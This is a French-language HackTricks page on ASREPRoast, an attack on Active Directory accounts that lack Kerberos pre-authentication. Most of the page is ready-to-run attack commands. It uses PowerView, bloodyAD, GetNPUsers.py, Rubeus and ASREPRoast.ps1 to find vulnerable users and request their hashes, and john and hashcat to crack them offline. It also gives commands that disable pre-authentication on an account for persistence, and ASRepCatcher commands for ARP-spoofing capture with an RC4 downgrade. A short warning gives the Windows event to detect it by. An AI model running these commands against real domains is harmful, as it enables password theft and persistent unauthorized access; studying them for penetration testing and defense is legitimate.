# ASREPRoast

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## ASREPRoast

ASREPRoast est une attaque de sécurité qui exploite les utilisateurs qui manquent de l'**attribut requis de pré-authentification Kerberos**. Essentiellement, cette vulnérabilité permet aux attaquants de demander l'authentification d'un utilisateur auprès du Contrôleur de Domaine (DC) sans avoir besoin du mot de passe de l'utilisateur. Le DC répond alors avec un message chiffré avec la clé dérivée du mot de passe de l'utilisateur, que les attaquants peuvent tenter de cracker hors ligne pour découvrir le mot de passe de l'utilisateur.

Les principales exigences pour cette attaque sont :

* **Absence de pré-authentification Kerberos** : Les utilisateurs cibles ne doivent pas avoir cette fonctionnalité de sécurité activée.
* **Connexion au Contrôleur de Domaine (DC)** : Les attaquants ont besoin d'accéder au DC pour envoyer des demandes et recevoir des messages chiffrés.
* **Compte de domaine optionnel** : Avoir un compte de domaine permet aux attaquants d'identifier plus efficacement les utilisateurs vulnérables via des requêtes LDAP. Sans un tel compte, les attaquants doivent deviner les noms d'utilisateur.

#### Énumérer les utilisateurs vulnérables (besoin d'identifiants de domaine)

{% code title="Using Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Utiliser Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Demander un message AS_REP

{% code title="Utiliser Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Utiliser Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting avec Rubeus générera un 4768 avec un type de chiffrement de 0x17 et un type de pré-authentification de 0.
{% endhint %}

### Craquage
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistance

Force **preauth** non requis pour un utilisateur où vous avez des permissions **GenericAll** (ou des permissions pour écrire des propriétés) :

{% code title="Using Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Utiliser Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## ASREProast sans identifiants

Un attaquant peut utiliser une position de l'homme du milieu pour capturer les paquets AS-REP lorsqu'ils traversent le réseau sans dépendre de la désactivation de la pré-authentification Kerberos. Cela fonctionne donc pour tous les utilisateurs sur le VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nous permet de le faire. De plus, l'outil force les stations de travail des clients à utiliser RC4 en modifiant la négociation Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Références

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers expérimentés et des chasseurs de bugs !

**Aperçus sur le hacking**\
Engagez-vous avec du contenu qui explore le frisson et les défis du hacking

**Actualités de hacking en temps réel**\
Restez à jour avec le monde du hacking en rapide évolution grâce à des nouvelles et des aperçus en temps réel

**Dernières annonces**\
Restez informé des nouveaux programmes de bug bounty lancés et des mises à jour cruciales des plateformes

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez à collaborer avec les meilleurs hackers dès aujourd'hui !

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
